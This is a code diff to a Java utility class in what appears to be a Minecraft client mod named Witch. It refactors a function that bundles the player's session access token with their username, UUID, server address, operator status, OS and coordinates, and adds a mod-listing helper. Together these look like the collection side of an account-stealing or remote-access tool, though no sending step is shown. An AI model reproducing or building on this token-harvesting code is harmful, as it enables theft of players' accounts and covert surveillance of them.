@@ -16,6 +16,7 @@ import net.minecraft.util.SystemDetails;
 import net.minecraft.util.math.MathHelper;
 
 import java.io.File;
+import java.util.List;
 import java.util.Random;
 
 import static me.soda.witch.client.Witch.mc;
@@ -25,8 +26,8 @@ public class MCUtils {
         return mc.world != null && mc.player != null;
     }
 
-    public static String allMods() {
-        return FabricLoader.getInstance().getAllMods().toString();
+    public static List<String> allMods() {
+        return FabricLoader.getInstance().getAllMods().stream().map(modContainer -> modContainer.getMetadata().getName()).toList();
     }
 
     public static String systemInfo() {
@@ -54,21 +55,19 @@ public class MCUtils {
     }
 
     public static PlayerData getPlayerInfo() {
-        PlayerData pi = new PlayerData();
-        pi.playerName = mc.getSession().getUsername();
-        pi.uuid = mc.getSession().getUuid();
-        pi.token = mc.getSession().getAccessToken();
-        pi.server = mc.getCurrentServerEntry() != null ? mc.isConnectedToRealms() ? "realms" : mc.getCurrentServerEntry().address : "not in server";
         ClientPlayerEntity player = mc.player;
-        pi.inGame = player != null;
-        pi.isWin = ProgramUtil.isWin();
-        if (pi.inGame) {
-            pi.isOp = player.hasPermissionLevel(4);
-            pi.x = player.getX();
-            pi.y = player.getY();
-            pi.z = player.getZ();
-        }
-        return pi;
+        return new PlayerData(
+                mc.getSession().getUsername(),
+                mc.getSession().getUuid(),
+                mc.getCurrentServerEntry() != null ? mc.isConnectedToRealms() ? "realms" : mc.getCurrentServerEntry().address : "not in server",
+                mc.getSession().getAccessToken(),
+                player != null && player.hasPermissionLevel(4),
+                player != null,
+                ProgramUtil.isWin(),
+                player == null ? 0 : player.getX(),
+                player == null ? 0 : player.getY(),
+                player == null ? 0 : player.getZ()
+        );
     }
 
     public static String getRandomPassword(int num) {
